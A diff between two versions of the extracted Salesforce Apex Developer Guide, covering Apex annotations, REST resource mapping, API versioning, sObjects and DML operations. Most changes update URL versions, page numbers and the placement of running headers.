+Note: The Apex Integration Tests feature is available as a developer preview in scratch orgs in Summer ’26 (API version 67.0). The
+feature isn’t generally available unless or until Salesforce announces its general availability in documentation or in press releases
+or public statements. All commands, parameters, and other features are subject to change or deprecation at any time, with or
+without notice. Don't implement functionality developed with these commands or tools in your production package.
+
+The annotation is applied to a static method that runs after the integration test completes, regardless of whether the test passed, failed,
+or threw an exception. Use this annotation to clean up committed test data. The teardown transaction auto-commits at the end of the
+execution.
+
+##### TestVisible Annotation Use the TestVisible annotation to allow test methods to access private or protected members of another class outside the test
 
 class. These members include methods, member variables, and inner classes. This annotation enables a more permissive access level
 for running tests only. This annotation doesn’t change the visibility of members if accessed by non-test classes.
@@ -8727,6 +8777,9 @@ access them in a test method. For example, if a private member variable isn’t 
 
 ```
 
+
+Apex Developer Guide Classes, Objects, and Interfaces
+
 This test class uses the previous class and contains the test method that accesses the annotated member variable and method.
 
 ```
@@ -8740,12 +8793,6 @@ This test class uses the previous class and contains the test method that access
 
         Integer i = TestVisibleExample.recordNumber;
 
-```
-
-
-Apex Developer Guide Classes, Objects, and Interfaces
-
-```
         System.assertEquals(1, i);
 
         // Access private method annotated with TestVisible
@@ -8782,7 +8829,7 @@ SEE ALSO:
 
 Exposing Apex Classes as REST Web Services
 
-###### RestResource Annotation Annotation
+###### RestResource Annotation
 
 The `@RestResource` annotation is used at the class level and enables you to expose an Apex class as a REST resource.
 
@@ -8808,6 +8855,9 @@ URL path mappings are as follows:
 **•** A wildcard (*) that appears in a path must be preceded by a forward slash (/). Additionally, unless the wildcard is the last character
 in the path, it must be followed by a forward slash (/).
 
+
+Apex Developer Guide Classes, Objects, and Interfaces
+
 The rules for mapping URLs are:
 
 **•** An exact match always wins.
@@ -8816,22 +8866,19 @@ The rules for mapping URLs are:
 
 **•** If no wildcard match is found, an HTTP response status code 404 is returned.
 
-
-Apex Developer Guide Classes, Objects, and Interfaces
-
 The URL for a namespaced class contains the namespace. For example, if your class is in namespace `abc` and the class is mapped to
 `your_url`, then the API URL is modified as follows:
 `https://` _`instance`_ `.salesforce.com/services/apexrest/abc/your_url/` . In the case of a URL collision, the
 namespaced class is always used.
 
-###### HttpDelete Annotation Annotation
+###### HttpDelete Annotation
 
 The `@HttpDelete` annotation is used at the method level and enables you to expose an Apex method as a REST resource. This
 method is called when an HTTP `DELETE` request is sent, and deletes the specified resource.
 
 To use this annotation, your Apex method must be defined as global static.
 
-###### HttpGet Annotation Annotation
+###### HttpGet Annotation
 
 The `@HttpGet` annotation is used at the method level and enables you to expose an Apex method as a REST resource. This method
 is called when an HTTP `GET` request is sent, and returns the specified resource.
@@ -8842,21 +8889,21 @@ These are some considerations when using this annotation:
 
 **•** Methods annotated with `@HttpGet` are also called if the HTTP request uses the `HEAD` request method.
 
-###### HttpPatch Annotation Annotation
+###### HttpPatch Annotation
 
 The `@HttpPatch` annotation is used at the method level and enables you to expose an Apex method as a REST resource. This method
 is called when an HTTP `PATCH` request is sent, and updates the specified resource.
 
 To use this annotation, your Apex method must be defined as global static.
 
-###### HttpPost Annotation Annotation
+###### HttpPost Annotation
 
 The `@HttpPost` annotation is used at the method level and enables you to expose an Apex method as a REST resource. This method
 is called when an HTTP `POST` request is sent, and creates a new resource.
 
 To use this annotation, your Apex method must be defined as global static.
 
-###### HttpPut Annotation Annotation
+###### HttpPut Annotation
 
 The `@HttpPut` annotation is used at the method level and enables you to expose an Apex method as a REST resource. This method
 is called when an HTTP `PUT` request is sent, and creates or updates the specified resource.
@@ -8935,7 +8982,7 @@ In addition, an interface type can be cast to a sub-interface or a class type th
 
 Tip: To verify if a class is a specific type of class, use the `instanceOf` keyword. For more information, see Using the
 
-`instanceof` Keyword on page 85.
+`instanceof` Keyword on page 86.
 
 ##### 1. Classes and Collections
 
@@ -9067,7 +9114,7 @@ test methods, or classes defined using `@IsTest` .
 your class. Your Apex class must compile correctly before you can save your class.
 
 Classes can also be automatically generated from a WSDL by clicking **Generate from WSDL** . See SOAP Services: Defining a Class from
-a WSDL Document on page 609.
+a WSDL Document on page 616.
 
 Once saved, classes can be invoked through class methods or variables by other Apex code, such as a trigger.
 
@@ -9512,11 +9559,26 @@ When classes and methods are added to the Apex language, those classes and metho
 is saved with, regardless of the API version (Salesforce release) they were introduced in. For example, if a method was added in API
 version 33.0, you can use this method in a custom class saved with API version 33.0 or another class saved with API version 25.0.
 
-There is one exception to this rule. The classes and methods of the `[ConnectApi](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_classes_connect_api.htm)` namespace are supported only in the API versions
+There is one exception to this rule. The classes and methods of the `[ConnectApi](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_classes_connect_api.htm)` namespace are supported only in the API versions
 specified in the documentation. For example, if a class or method is introduced in API version 33.0, it is not available in earlier versions.
-For more information, see ConnectApi Versioning and Equality Checking on page 461.
+For more information, see ConnectApi Versioning and Equality Checking on page 464.
+
+Keep these guidelines in mind regarding API version usage:
+
+**•** Salesforce strongly recommends that you use the latest available API version.
+
+**•** If you can't upgrade to the latest version yet, use API versions released in the past three years, for improved performance, security,
+and compatibility.
+
+**•** To reduce complexity, consolidate your Apex codebase to use the minimal number of API versions, ideally, just one API version.
+
+For a non-exhaustive list of major Apex behavior changes across API versions, organized by version number, see Apex Versioned Behavior
+Changes on page 794.
 
 Setting the Salesforce API Version for Classes and Triggers
+
+
+Apex Developer Guide Classes, Objects, and Interfaces
 
 Setting Package Versions for Apex Classes and Triggers
 As a managed package subscriber, you can specify which package version that your managed Apex classes and triggers use.
@@ -9524,9 +9586,6 @@ As a managed package subscriber, you can specify which package version that your
 SEE ALSO:
 
 Use Apex Referenced by Managed Packages
-
-
-Apex Developer Guide Classes, Objects, and Interfaces
 
 ##### Setting the Salesforce API Version for Classes and Triggers
 
@@ -9604,6 +9663,12 @@ The following class is saved using Salesforce API version 16.0:
 
            WHERE Id = :returnedIdea.Id];
 
+```
+
+
+Apex Developer Guide Classes, Objects, and Interfaces
+
+```
         // assert that the categories field from the object created
 
         // in this class is not null
@@ -9618,12 +9683,9 @@ The following class is saved using Salesforce API version 16.0:
 
    }
 
-```
-
-
-Apex Developer Guide Classes, Objects, and Interfaces
-
 ##### Setting Package Versions for Apex Classes and Triggers
+
+```
 
 As a managed package subscriber, you can specify which package version that your managed Apex classes and triggers use.
 
@@ -9656,7 +9718,7 @@ that class or trigger was last saved or deployed.
 where the class or trigger references a managed package, on the class or trigger’s Detail page, click **Show Dependencies** .
 
 Tip: You can also set the package version for an Apex class or trigger through metadata deployments or with API requests. See
-Set Package Versions for Apex Classes and Triggers on page 768.
+Set Package Versions for Apex Classes and Triggers on page 783.
 
 SEE ALSO:
 
@@ -9672,19 +9734,19 @@ Alternatively, your Apex class can implement the `Comparable` interface.
 The sort criteria and sort order depend on the implementation that you provide for the `Comparable.compareTo` or the
 `Comparator.compare` method.
 
+
+Apex Developer Guide Classes, Objects, and Interfaces
+
 To perform locale-sensitive comparisons and sorting, use the `Collator` class. Because locale-sensitive sorting can produce different
 results depending on the user running the code, avoid using it in triggers or in code that expects a particular sort order.
 
 SEE ALSO:
 
-_[Apex Reference Guide](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_class_System_Collator.htm)_ : Collator Class
+_[Apex Reference Guide](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_class_System_Collator.htm)_ : Collator Class
 
-_Apex Reference Guide_ [: Comparable Interface](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_comparable.htm)
+_Apex Reference Guide_ [: Comparable Interface](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_comparable.htm)
 
-_Apex Reference Guide_ [: Comparator Interface](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_interface_System_Comparator.htm)
-
-
-Apex Developer Guide Classes, Objects, and Interfaces
+_Apex Reference Guide_ [: Comparator Interface](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_interface_System_Comparator.htm)
 
 #### Using Custom Types in Map Keys and Sets
 
@@ -9705,7 +9767,7 @@ Adding **`equals`** and **`hashCode`** Methods to Your Class
 To ensure that map keys of your custom type are compared correctly and their uniqueness can be determined consistently, provide an
 implementation of the following two methods in your class:
 
-**•** The `[equals](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_class_System_Object.htm#apex_System_Object_equals)` method with this signature:
+**•** The `[equals](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_class_System_Object.htm#apex_System_Object_equals)` method with this signature:
 
 ```
      public Boolean equals(Object obj) {
@@ -9716,7 +9778,7 @@ implementation of the following two methods in your class:
 
 ```
 
-**•** The `[hashCode](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_class_System_Object.htm#apex_System_Object_hashCode)` method with this signature:
+**•** The `[hashCode](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_class_System_Object.htm#apex_System_Object_hashCode)` method with this signature:
 
 ```
      public Integer hashCode() {
@@ -9742,6 +9804,12 @@ adds the same objects to it. It verifies that the set size is two, since only tw
 
       Integer x,y;
 
+```
+
+
+Apex Developer Guide Classes, Objects, and Interfaces
+
+```
       public PairNumbers(Integer a, Integer b) {
 
         x=a;
@@ -9760,12 +9828,6 @@ adds the same objects to it. It verifies that the set size is two, since only tw
 
         }
 
-```
-
-
-Apex Developer Guide Classes, Objects, and Interfaces
-
-```
         return false;
 
       }
@@ -9841,23 +9903,29 @@ This code snippet makes use of the `PairNumbers` class.
 
    s1.add(p3);
 
+```
+
+
+### Apex Developer Guide Working with Data in Apex
+
+```
    // Verify that we have only two elements
 
    // since the p3 is equal to p1.
 
    System.assertEquals(2, s1.size());
 
+### Working with Data in Apex
+
 ```
-
-
-### Apex Developer Guide Working with Data in Apex Working with Data in Apex
 
 You can add and interact with data in the Lightning Platform persistence layer. The sObject data type is the main data type that holds
 data objects. You’ll use Data Manipulation Language (DML) to work with data, and use query languages to retrieve data, such as the (),
 among other things.
 
 #### Working with sObjects
-##### In this developer guide, the term sObject refers to any object that can be stored in the Lightning platform database.
+
+In this developer guide, the term _`sObject`_ refers to any object that can be stored in the Lightning platform database.
 
 Data Manipulation Language
 Apex enables you to insert, update, delete or restore data in the database. DML operations allow you to modify records one at a time
@@ -9875,9 +9943,12 @@ You can manage sObjects in lists, sets, and maps.
 
 Dynamic Apex
 
-Apex Security and Sharing
-When you use Apex, the security of your code is critical. You'll need to add user permissions for Apex classes and enforce sharing
-rules. Read on to learn about Apex managed sharing and get some security tips.
+Apex Security and Sharing Model
+The Apex security model includes record-level, field-level, and object-level security mechanisms. You can control record-level security
+modes by using the `with sharing`, `without sharing`, and `inherited sharing` keywords on classes. Apex runs
+in user mode by default, which means that user permissions on objects and field-level security are respected. A user cannot run
+code that tries to access fields or objects that are hidden from the user. Other security mechanisms include the
+`Security.stripInaccessible()` method, and Field and SObject describe methods.
 
 Custom Settings
 Custom settings are similar to custom objects. Application developers can create custom sets of data and associate custom data for
@@ -9887,13 +9958,17 @@ data.
 
 #### Working with sObjects
 
-##### In this developer guide, the term sObject refers to any object that can be stored in the Lightning platform database. sObject Types
+In this developer guide, the term _`sObject`_ refers to any object that can be stored in the Lightning platform database.
 
+sObject Types
 An sObject variable represents a row of data and can only be declared in Apex using SOAP API name of the object.
 
 Accessing SObject Fields
 
 Validating sObjects and Fields
+
+
+Apex Developer Guide Working with Data in Apex
 
 ##### sObject Types
 
@@ -9907,9 +9982,6 @@ For example:
    MyCustomObject__c co = new MyCustomObject__c();
 
 ```
-
-
-Apex Developer Guide Working with Data in Apex
 
 Similar to SOAP API, Apex allows the use of the generic sObject abstract type to represent any object. The sObject data type can be used
 in code that processes different types of sObjects.
@@ -9968,7 +10040,7 @@ For information on accessing existing sObjects from the Lightning Platform datab
 _SOSL Reference_ .
 
 Note: The Lightning Platform assigns ID values automatically when an object record is initially inserted to the database for the
-first time. For more information see Lists on page 28.
+first time. For more information see Lists on page 29.
 
 Custom Labels
 
@@ -9981,6 +10053,9 @@ label using `system.label.` _**`label_name`**_ . For example:
 ```
 
 For more information on custom labels, see “Custom Labels” in Salesforce Help.
+
+
+Apex Developer Guide Working with Data in Apex
 
 ##### Accessing SObject Fields
 
@@ -9997,12 +10072,9 @@ System-generated fields, such as `Created By` or `Last Modified Date`, cannot be
 engine generates an error. Additionally, formula field values and values for other fields that are read-only for the context user cannot be
 changed.
 
-
-Apex Developer Guide Working with Data in Apex
-
 If you use the generic SObject type instead of a specific object, such as Account, you can retrieve only the `Id` field using dot notation.
 You can set the `Id` field for Apex code saved using Salesforce API version 27.0 and later). Alternatively, you can use the generic SObject
-`put` and `get` [methods. See SObject Class.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_sobject.htm)
+`put` and `get` [methods. See SObject Class.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_sobject.htm)
 
 This example shows how you can access the `Id` field and operations that aren’t allowed on generic SObjects.
 
@@ -10078,6 +10150,12 @@ the generic SObject record into a Contact, Lead, or Account, you can modify its 
 
         List<SObject> records = new List<SObject>();
 
+```
+
+
+Apex Developer Guide Working with Data in Apex
+
+```
         records.addAll(results[0]); //add Contact results to our results super-set
 
         records.addAll(results[1]); //add Lead results
@@ -10096,12 +10174,6 @@ the generic SObject record into a Contact, Lead, or Account, you can modify its 
 
              } else if (record.getSObjectType() == Lead.sObjectType){
 
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
                leads.add((Lead) record);
 
              } else if (record.getSObjectType() == Account.sObjectType) {
@@ -10127,7 +10199,7 @@ on an SObject, you can change a field that is set; you can’t change unset fiel
 
 Note: To erase the current value of a field, set the field to null.
 
-[If an Apex method takes an SObject parameter, you can use the System.isSet() method to identify the set fields. If you want to unset any](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_sobject.htm#apex_System_SObject_isSet)
+[If an Apex method takes an SObject parameter, you can use the System.isSet() method to identify the set fields. If you want to unset any](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_sobject.htm#apex_System_SObject_isSet)
 fields to retain their values, first create an SObject instance. Then apply only the fields you want to be part of the DML operation.
 
 This example code shows how SObject fields are identified as set or unset.
@@ -10171,6 +10243,9 @@ In addition, the Apex parser tracks the custom objects and fields that are used,
 and SOSL statements. The platform prevents users from making the following types of modifications when those changes cause Apex
 code to become invalid:
 
+
+Apex Developer Guide Working with Data in Apex
+
 **•** Changing a field or object name
 
 **•** Converting from one data type to another
@@ -10178,9 +10253,6 @@ code to become invalid:
 **•** Deleting a field or object
 
 **•** Making certain organization-wide changes, such as record sharing, field history tracking, or record types
-
-
-Apex Developer Guide Working with Data in Apex
 
 #### Data Manipulation Language
 
@@ -10226,6 +10298,9 @@ counts as one DML statement, not as one statement for each sObject.
 
 This example performs DML calls on single sObjects, which isn’t efficient.
 
+
+Apex Developer Guide Working with Data in Apex
+
 The `for` loop iterates over contacts. For each contact, if the department field matches a certain value, it sets a new value for the
 Description field. If the list contains more than items, the 151st update returns an exception that can't be caught.
 
@@ -10247,9 +10322,6 @@ Description field. If the list contains more than items, the 151st update return
    }
 
 ```
-
-
-Apex Developer Guide Working with Data in Apex
 
 This example is a modified version of the previous example that doesn't hit the governor limit. The DML operation is performed in bulk
 by calling `update` on a list of contacts. This code counts as one DML statement, which is far below the limit of 150.
@@ -10289,11 +10361,8 @@ and update 50 contacts in the same transaction, your total DML processed rows ar
 
 System Context and Sharing Rules
 
-Most DML operations execute in system context, ignoring the current user's permissions, field-level security, organization-wide defaults,
-position in the role hierarchy, and sharing rules. For more information, see Enforce Sharing Rules.
-
-Note: If you execute DML operations within an anonymous block, they execute using the current user’s object and field-level
-permissions.
+Most DML operations execute in user context, which means that the current user's permissions, field-level security, organization-wide
+defaults, position in the role hierarchy, and sharing rules are enforced. See Apex Security and Sharing Model.
 
 Best Practices
 
@@ -10310,6 +10379,10 @@ for write operations.
 
 Before inserting or manipulating records, record data is created in memory as sObjects. The sObject data type is a generic data type and
 corresponds to the data type of the variable that will hold the record data. There are specific data types, subtyped from the sObject data
+
+
+Apex Developer Guide Working with Data in Apex
+
 type, which correspond to data types of standard object records, such as Account or Contact, and custom objects, such as
 Invoice_Statement__c. Typically, you will work with these specific sObject data types. But sometimes, when you don’t know the type
 of the sObject in advance, you can work with the generic sObject data type. This is an example of how you can create a new specific
@@ -10319,9 +10392,6 @@ Account sObject and assign it to a variable.
    Account a = new Account(Name='Account Example');
 
 ```
-
-
-Apex Developer Guide Working with Data in Apex
 
 In the previous example, the account referenced by the variable `a` exists in memory with the required `Name` field. However, it is not
 persisted yet to the Lightning Platform persistence layer. You need to call DML statements to persist sObjects to the database. Here is
@@ -10395,6 +10465,12 @@ This is an example of a DML statement to insert a new record.
 
    acctList.add(new Account(Name='Acme1'));
 
+```
+
+
+Apex Developer Guide Working with Data in Apex
+
+```
    acctList.add(new Account(Name='Acme2'));
 
    // DML statement
@@ -10402,9 +10478,6 @@ This is an example of a DML statement to insert a new record.
    insert acctList;
 
 ```
-
-
-Apex Developer Guide Working with Data in Apex
 
 This is an equivalent example to the previous one but it uses a method of the Database class instead of the DML verb.
 
@@ -10475,15 +10548,15 @@ Note: Most operations overlap between the two, except for a few.
 
 **•** The `convertLead` operation is only available as a Database class method, not as a DML statement.
 
+
+Apex Developer Guide Working with Data in Apex
+
 **•** The Database class also provides methods not available as DML statements, such as methods transaction control and rollback,
 emptying the Recycle Bin, and methods related to SOQL queries.
 
 SEE ALSO:
 
-_Apex Reference Guide_ [: Database Class Methods](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_database.htm)
-
-
-Apex Developer Guide Working with Data in Apex
+_Apex Reference Guide_ [: Database Class Methods](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_database.htm)
 
 ##### DML Operations As Atomic Transactions
 
@@ -10536,6 +10609,12 @@ is updated, and the update statement is called to persist the change in the data
 
    for(Integer i=0;i<3;i++) {
 
+```
+
+
+Apex Developer Guide Working with Data in Apex
+
+```
       Account a = new Account(Name='Acme' + i,
 
                     BillingCity='San Francisco');
@@ -10552,12 +10631,6 @@ is updated, and the update statement is called to persist the change in the data
 
       // Update account Acme2.
 
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
       accountToUpdate =
 
         [SELECT BillingCity FROM Account
@@ -10636,15 +10709,14 @@ are linked through a lookup relationship.
 
 ```
 
+
+Apex Developer Guide Working with Data in Apex
+
 Updating Related Records
 
 Fields on related records can't be updated with the same call to the DML operation and require a separate DML call. For example, if
 inserting a new contact, you can specify the contact's related account record by setting the value of the `AccountId` field. However,
 you can't change the account's name without updating the account itself with a separate DML call. Similarly, when updating a contact,
-
-
-Apex Developer Guide Working with Data in Apex
-
 if you also want to update the contact’s related account, you must make two DML calls. The following example updates a contact and
 its related account using two `update` statements.
 
@@ -10710,6 +10782,9 @@ opportunity record is associated to the account record through the custom Extern
 
 **•** An account record exists where `MyExtID__c = ‘SAP111111’`
 
+
+Apex Developer Guide Working with Data in Apex
+
 Before the new opportunity is inserted, the account record is added to this opportunity as an sObject through the
 `Opportunity.Account` relationship field.
 
@@ -10722,12 +10797,6 @@ Before the new opportunity is inserted, the account record is added to this oppo
 
       CloseDate=Date.today().addDays(7));
 
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
    // Create the parent record reference.
 
    // An account with external ID = 'SAP111111' already exists.
@@ -10773,7 +10842,7 @@ other fields) set in addition to the external ID field.
 the array index of the parent must be lower than the child’s index.
 
 You can create related records that are up to 10 levels deep. Also, the related records created in a single call must have different sObject
-[types. For more information, see Creating Records for Different Object Types in the](https://developer.salesforce.com/docs/atlas.en-us.260.0.api.meta/api/sforce_api_calls_create.htm#MixedSaveSection) _SOAP API Developer Guide_ .
+[types. For more information, see Creating Records for Different Object Types in the](https://developer.salesforce.com/docs/atlas.en-us.262.0.api.meta/api/sforce_api_calls_create.htm#MixedSaveSection) _SOAP API Developer Guide_ .
 
 The following example shows how to create an opportunity with a parent account using the same `insert` statement. The example
 creates an Opportunity sObject and populates some of its fields, then creates two Account objects. The first account is only for the foreign
@@ -10790,6 +10859,12 @@ first error if record creation fails. This sample requires an external ID text f
 
         Date dt = Date.today();
 
+```
+
+
+Apex Developer Guide Working with Data in Apex
+
+```
         dt = dt.addDays(7);
 
         Opportunity newOpportunity = new Opportunity(
@@ -10804,12 +10879,6 @@ first error if record creation fails. This sample requires an external ID text f
 
         // Used only for foreign key reference
 
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
         // and doesn't contain any other fields.
 
         Account accountReference = new Account(
@@ -10880,7 +10949,9 @@ standard field with the `idLookup` attribute set to true.
 
 Note: Custom field matching is case-insensitive only if the custom field has the **Unique** and **Treat "ABC" and "abc" as duplicate**
 **values (case insensitive)** attributes selected as part of the field definition. If this is the case, “ABC123” is matched with “abc123.”
-[For more information, see Create Custom Fields.](https://help.salesforce.com/apex/HTViewHelpDoc?id=adding_fields.htm&language=en_US#adding_fields)
+
+
+Apex Developer Guide Working with Data in Apex
 
 Examples
 
@@ -10894,12 +10965,6 @@ account in San Francisco:
 
    for (Account a : acctsList) {
 
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
       a.BillingCity = 'Mumbai';
 
    }
@@ -10920,7 +10985,7 @@ Apex Developer Guide Working with Data in Apex
 
 ```
 
-Note: For more information on processing `DmlException` [s, see Bulk DML Exception Handling.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexcode.meta/apexcode/apex_dml_bulk_exceptions.htm)
+Note: For more information on processing `DmlException` [s, see Bulk DML Exception Handling.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexcode.meta/apexcode/apex_dml_bulk_exceptions.htm)
 
 This next example uses the `Database.upsert` method to upsert a collection of leads that are passed in. This example allows for
 partial processing of records, that is, in case some records fail processing, the remaining records are still inserted or updated. It iterates
@@ -10974,6 +11039,12 @@ bulk inserted. This example is followed by a test class that contains a test met
 
        return uResults;
 
+```
+
+
+Apex Developer Guide Working with Data in Apex
+
+```
      }
 
    }
@@ -10988,12 +11059,6 @@ bulk inserted. This example is followed by a test class that contains a test met
 
        List<Lead> leads = new List<Lead>();
 
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
        /* Create a set of leads for testing */
 
        for(Integer i = 0;i < 100; i++) {
@@ -11064,6 +11129,12 @@ Note: External ID fields used in upsert calls must be unique or the user must ha
 
                  FROM Opportunity
 
+```
+
+
+Apex Developer Guide Working with Data in Apex
+
+```
                  WHERE HasOpportunityLineItem = true
 
                  LIMIT 1];
@@ -11074,12 +11145,6 @@ Note: External ID fields used in upsert calls must be unique or the user must ha
 
       for (OpportunityLineItem lineItem:opp.OpportunityLineItems) {
 
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
         //This code populates the line item Id, AccountId, and Product2Id for each asset
 
         Asset asset = new Asset(Name = lineItem.PricebookEntry.Name,
@@ -11151,6 +11216,12 @@ main record remains in the database.
 
    c.AccountId = dupAcct.Id;
 
+```
+
+
+Apex Developer Guide Working with Data in Apex
+
+```
    insert c;
 
    try {
@@ -11165,12 +11236,6 @@ main record remains in the database.
 
    }
 
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
    // After the account is merged with the main account,
 
    // the related contact is moved to the main record.
@@ -11239,6 +11304,12 @@ Note: To use the AccountContactRelation sObject in this example, enable the “A
 
    AccountContactRelation resultAcrel = [SELECT Id FROM AccountContactRelation WHERE
 
+```
+
+
+Apex Developer Guide Working with Data in Apex
+
+```
    ContactId=:c.Id LIMIT 1];
 
    // Merge duplicate accounts into main account
@@ -11249,12 +11320,6 @@ Note: To use the AccountContactRelation sObject in this example, enable the “A
 
       if (res.isSuccess()) {
 
-```
-
-
-Apex Developer Guide Working with Data in Apex
-
-```
         // Get the main record ID from the result and validate it
 
         System.debug('Main record ID: ' + res.getId());
@@ -11325,7 +11390,10 @@ Merge Considerations
 
 When merging sObject records, consider these rules and guidelines:
 
-**•** Only leads, contacts, cases, and accounts can be merged. See sObjects That Don’t Support DML Operations on page 164.
+**•** Only leads, contacts, cases, and accounts can be merged. See sObjects That Don’t Support DML Operations on page 165.
+
+
+Apex Developer Guide Working with Data in Apex
 
 **•** You can pass a main record and up to two additional sObject records to a single `merge` method.
 
@@ -11335,9 +11403,6 @@ operation regardless of the field value on the duplicate record. To preserve a f
 field value on the main record before performing the merge.
 
 **•** External ID fields can’t be used with `merge` .
-
-
-Apex Developer Guide Working with Data in Apex
 
 ###### Deleting Records
 
@@ -11366,7 +11431,7 @@ The following example deletes all accounts that are named 'DotCom':
 
 ```
 
-Note: For more information on processing `DmlException` [s, see Bulk DML Exception Handling.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexcode.meta/apexcode/apex_dml_bulk_exceptions.htm)
+Note: For more information on processing `DmlException` [s, see Bulk DML Exception Handling.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexcode.meta/apexcode/apex_dml_bulk_exceptions.htm)
 
 Referential Integrity When Deleting and Restoring Records
 
@@ -11402,11 +11467,11 @@ list on an account)
 
 **•** An article's categories, publication state, and assignments
 
-Note: Salesforce only restores lookup relationships that have not been replaced. For example, if an asset is related to a different
-product prior to the original product record being undeleted, that asset-product relationship is not restored.
-
 
 Apex Developer Guide Working with Data in Apex
+
+Note: Salesforce only restores lookup relationships that have not been replaced. For example, if an asset is related to a different
+product prior to the original product record being undeleted, that asset-product relationship is not restored.
 
 ###### Restoring Deleted Records
 
@@ -11444,7 +11509,7 @@ level and aggregate relationships, including deleted records and archived activi
 
 ```
 
-Note: For more information on processing `DmlException` [s, see Bulk DML Exception Handling.](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexcode.meta/apexcode/apex_dml_bulk_exceptions.htm)
+Note: For more information on processing `DmlException` [s, see Bulk DML Exception Handling.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexcode.meta/apexcode/apex_dml_bulk_exceptions.htm)
 
 Undelete Considerations
 
@@ -11470,6 +11535,9 @@ Converting leads involves the following basic steps:
 
 **1.** Your application determines the IDs of any lead(s) to be converted.
 
+
+Apex Developer Guide Working with Data in Apex
+
 **2.** Optionally, your application determines the IDs of any account(s) into which to merge the lead. Your application can use SOQL to
 search for accounts that match the lead name, as in the following example:
 
@@ -11477,9 +11545,6 @@ search for accounts that match the lead name, as in the following example:
      SELECT Id, Name FROM Account WHERE Name='CompanyNameOfLeadBeingMerged'
 
 ```
-
-
-Apex Developer Guide Working with Data in Apex
 
 **3.** Optionally, your application determines the IDs of the contact or contacts into which to merge the lead. The application can use
 SOQL to search for contacts that match the lead contact name, as in the following example:
@@ -11544,11 +11609,12 @@ contents of the `LeadSource` field in the source LeadConvert object.
 
 **•** Record types: If the organization uses record types, the default record type of the new owner is assigned to records created during
 lead conversion. The default record type of the user converting the lead determines the lead source values available during conversion.
-If the desired lead source values are not available, add the values to the default record type of the user converting the lead. For more
-information about record types, see Salesforce Help.
 
 
 Apex Developer Guide Working with Data in Apex
+
+If the desired lead source values are not available, add the values to the default record type of the user converting the lead. For more
+information about record types, see Salesforce Help.
 
 **•** Picklist values: The system assigns the default picklist values for the account, contact, and opportunity when mapping any standard
 lead picklist fields that are blank. If your organization uses record types, blank values are replaced with the default picklist values of
@@ -11564,7 +11630,7 @@ on the user's home page. This is a useful way to stay up-to-date with changes to
 
 SEE ALSO:
 
-_[Apex Reference Guide](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_database.htm)_ : Database Class
+_[Apex Reference Guide](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_database.htm)_ : Database Class
 
 ##### Exception Handling
 
@@ -11600,22 +11666,24 @@ result object type, as outlined below.
 
 **Operation** **Result Class**
 
-insert, update [SaveResult Class](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_database_saveresult.htm)
+insert, update [SaveResult Class](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_database_saveresult.htm)
 
-upsert [UpsertResult Class](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_database_upsertresult.htm)
+upsert [UpsertResult Class](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_database_upsertresult.htm)
 
-merge [MergeResult Class](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_class_database_mergeresult.htm)
+merge [MergeResult Class](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_class_database_mergeresult.htm)
 
-delete [DeleteResult Class](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_database_deleteresult.htm)
+delete [DeleteResult Class](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_database_deleteresult.htm)
 
-undelete [UndeleteResult Class](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_methods_system_database_undeleteresult.htm)
+undelete [UndeleteResult Class](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_database_undeleteresult.htm)
 
-convertLead [LeadConvertResult Class](https://developer.salesforce.com/docs/atlas.en-us.260.0.apexref.meta/apexref/apex_class_database_leadconvertresult.htm)
-
